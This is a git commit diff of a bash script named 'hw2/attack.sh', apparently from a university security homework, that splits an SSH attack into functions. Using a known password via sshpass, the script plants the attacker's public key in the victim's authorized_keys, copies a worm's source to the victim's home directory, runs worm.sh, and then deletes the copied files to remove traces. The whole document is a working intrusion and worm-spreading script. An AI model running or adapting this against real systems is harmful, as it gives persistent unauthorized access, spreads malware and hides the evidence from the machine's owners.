61403cd9554df0effa4d75be542a7e4b064d5783
YU-AN CHEN <yuanchen@cs.nctu.edu.tw>
2019-04-28 16:04:09 +0800

    Update attack.sh

--- hw2/attack.sh
+++ hw2/attack.sh
@@ -6,11 +6,33 @@ usage() {
 }
 
 ssh_key_inject() {
+  echo "Launching SSH-Key Inject..."
   sshpass -p "$victim_password" ssh "$victim_ip" -l "$victim_username" "mkdir -m 700 ~/.ssh/"
   sshpass -p "$victim_password" scp "$public_key" "$victim_username"@"$victim_ip":"$key_inject_location"
 }
 
+worm_replicate() {
+echo "Worms Replication through SSH..."
+sshpass -p "$victim_password" scp -r "$src_dir" "$victim_username"@"$victim_ip":"$target_dir"
+}
+
+launching_worm() {
+  sshpass -p "$victim_password" ssh "$victim_ip" -l "$victim_username" "cd $target_dir/src && ./worm.sh"
+}
+
+remove_trace() {
+  echo "Removeing Trace..."
+  sshpass -p "$victim_password" ssh "$victim_ip" -l "$victim_username" "rm -rf $target_dir/src"
+}
+
 payload() {
+  ssh_key_inject
+  worm_replicate
+  launching_worm
+  remove_trace
+}
+
+main() {
   local victim_username="$1"
   local victim_password="$2"
   local victim_ip="$3"
@@ -18,17 +40,6 @@ payload() {
   local key_inject_location="~/.ssh/authorized_keys"
   local src_dir="$PWD/src"
   local target_dir="/home/victim"
-  echo "Launching SSH-Key Inject..."
-  ssh_key_inject
-  echo "Worms Replication through SSH..."
-  sshpass -p "$victim_password" scp -r "$src_dir" "$victim_username"@"$victim_ip":"$target_dir"
-  # Launching Worm...
-  sshpass -p "$victim_password" ssh "$victim_ip" -l "$victim_username" "cd $target_dir/src && ./worm.sh"
-  echo "Removeing Trace..."
-  sshpass -p "$victim_password" ssh "$victim_ip" -l "$victim_username" "rm -rf $target_dir/src"
-}
-
-main() {
   if [ "$#" -eq 3 ]; then
     payload "$1" "$2" "$3"
   else
